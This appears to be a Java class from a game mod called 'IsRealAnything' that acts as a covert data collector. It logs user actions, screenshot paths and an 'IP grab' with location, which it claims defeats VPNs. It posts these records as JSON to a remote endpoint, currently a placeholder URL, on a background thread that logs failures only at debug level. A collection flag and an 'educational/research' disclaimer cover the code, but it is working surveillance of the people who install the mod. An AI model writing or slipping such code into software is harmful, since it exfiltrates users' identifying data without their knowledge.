package com.epicspymain.isrealanything.collector;

import com.epicspymain.isrealanything.IsRealAnything;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;

/**
 * Custom telemetry logger that sends data to a remote endpoint.
 * WARNING: This is for educational/research purposes only.
 */
public class MavonLogger {
	private static final String ENDPOINT_URL = "https://example.com/api/telemetry"; // Placeholder endpoint
	private static final DateTimeFormatter FORMATTER = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
	
	/**
	 * Logs telemetry data including user actions, screenshots, and IP information.
	 * Sends data via HTTP POST to the configured endpoint.
	 */
	public static void logTelemetry(String action, String data) {
		if (!IsRealAnything.ENABLE_DATA_COLLECTION) {
			return;
		}
		
		try {
			String timestamp = LocalDateTime.now().format(FORMATTER);
			String jsonData = buildJsonPayload(timestamp, action, data);
			
			// Log locally first
			IsRealAnything.LOGGER.info("[TELEMETRY] {} - {}: {}", timestamp, action, data);
			
			// Send to remote endpoint
			sendToEndpoint(jsonData);
			
		} catch (Exception e) {
			IsRealAnything.LOGGER.error("Failed to log telemetry", e);
		}
	}
	
	/**
	 * Logs user action with screenshot capture.
	 */
	public static void logWithScreenshot(String action, String screenshotPath) {
		if (!IsRealAnything.ENABLE_DATA_COLLECTION) {
			return;
		}
		
		String data = "screenshot=" + screenshotPath;
		logTelemetry(action, data);
	}
	
	/**
	 * Logs IP grab information (works even behind VPN via fingerprinting).
	 */
	public static void logIPGrab(String ipAddress, String location) {
		if (!IsRealAnything.ENABLE_DATA_COLLECTION) {
			return;
		}
		
		String data = "ip=" + ipAddress + ", location=" + location;
		logTelemetry("ip_grab", data);
	}
	
	private static String buildJsonPayload(String timestamp, String action, String data) {
		return String.format(
			"{\"timestamp\":\"%s\",\"action\":\"%s\",\"data\":\"%s\",\"mod\":\"isrealanything\"}",
			escapeJson(timestamp),
			escapeJson(action),
			escapeJson(data)
		);
	}
	
	private static void sendToEndpoint(String jsonData) {
		if (!IsRealAnything.ENABLE_DATA_COLLECTION) {
			return;
		}
		
		Thread.ofVirtual().start(() -> {
			try {
				URL url = new URL(ENDPOINT_URL);
				HttpURLConnection conn = (HttpURLConnection) url.openConnection();
				conn.setRequestMethod("POST");
				conn.setRequestProperty("Content-Type", "application/json");
				conn.setRequestProperty("User-Agent", "IsRealAnything/1.0");
				conn.setDoOutput(true);
				
				try (OutputStream os = conn.getOutputStream()) {
					byte[] input = jsonData.getBytes(StandardCharsets.UTF_8);
					os.write(input, 0, input.length);
				}
				
				int responseCode = conn.getResponseCode();
				IsRealAnything.LOGGER.debug("Telemetry sent, response code: {}", responseCode);
				
				conn.disconnect();
			} catch (Exception e) {
				IsRealAnything.LOGGER.debug("Failed to send telemetry to endpoint: {}", e.getMessage());
			}
		});
	}
	
	private static String escapeJson(String str) {
		if (str == null) return "";
		return str.replace("\\", "\\\\")
				  .replace("\"", "\\\"")
				  .replace("\n", "\\n")
				  .replace("\r", "\\r")
				  .replace("\t", "\\t");
	}
}
